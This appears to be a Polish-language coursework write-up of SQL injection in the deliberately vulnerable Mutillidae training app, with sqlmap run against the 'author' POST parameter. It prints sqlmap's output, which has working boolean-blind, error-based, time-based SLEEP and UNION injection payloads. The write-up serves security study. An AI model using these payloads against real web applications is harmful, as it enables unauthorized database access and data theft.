@@ -1,1 +1,46 @@
+## Nazwa podatności: SQLMAP Practice (SQL Injcetion - error-based oraz time-based blind)
+
+**Istotność:** 10
+
+---
+
+**Opis:**
+SQLMap to potężne narzędzie do automatycznego wykrywania i wykorzystywania podatności SQL Injection w aplikacjach internetowych. Jest napisane w języku Python i umożliwia atakującemu przeprowadzenie zautomatyzowanych testów penetracyjnych, identyfikując luki w zabezpieczeniach aplikacji, które mogą prowadzić do wstrzykiwania kodu SQL.
+
+---
+
+**Technika eksploatacji:**
+Po wybraniu z listy rozwijanej użytkownika, którego blog chce się zobaczyć wysyłane jest poniższe zapytanie POST na serwer:
+![image](https://github.com/GrzechuG/PWR-CBE-BAW-mutillidae-2024/assets/28838004/5e298ba7-8a60-47bc-ab5a-d2da964b306b)
+
+Utworzono plik request.txt z zawartością powyższego zapytania.
+![image](https://github.com/GrzechuG/PWR-CBE-BAW-mutillidae-2024/assets/28838004/d430c661-7a72-42cf-8d33-dc39255b3728)
+
+Atakowanymi parametrami są oraz `author` `view-someones-blog-php-submit-button`.
+
+Jak poniżej uruchomiono narzędzie sqlmap:
+![image](https://github.com/GrzechuG/PWR-CBE-BAW-mutillidae-2024/assets/28838004/163e2db8-bdf8-48d3-9057-1086ed0c81ca)
+
+Wykryło ono, iż parametr `author` jest podatnym parametrem. Ostatecznym wynikiem działania programu sqlmap jest:
+```sqlmap identified the following injection point(s) with a total of 83 HTTP(s) requests:
+---
+Parameter: author (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: author=admin' AND 2783=2783#&view-someones-blog-php-submit-button=View Blog Entries
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: author=admin' AND (SELECT 9586 FROM(SELECT COUNT(*),CONCAT(0x7176717671,(SELECT (ELT(9586=9586,1))),0x716b706b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- OhCA&view-someones-blog-php-submit-button=View Blog Entries
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: author=admin' AND (SELECT 3065 FROM (SELECT(SLEEP(5)))GkAB)-- URoT&view-someones-blog-php-submit-button=View Blog Entries
+
+    Type: UNION query
+    Title: MySQL UNION query (random number) - 4 columns
+    Payload: author=admin' UNION ALL SELECT 5318,5318,5318,CONCAT(0x7176717671,0x654b6f75534a4f4a415a596e4169706d436365645a45524d764b5a5078554c415779684b6b744351,0x716b706b71)#&view-someones-blog-php-submit-button=View Blog Entries
+---
+```
+
 
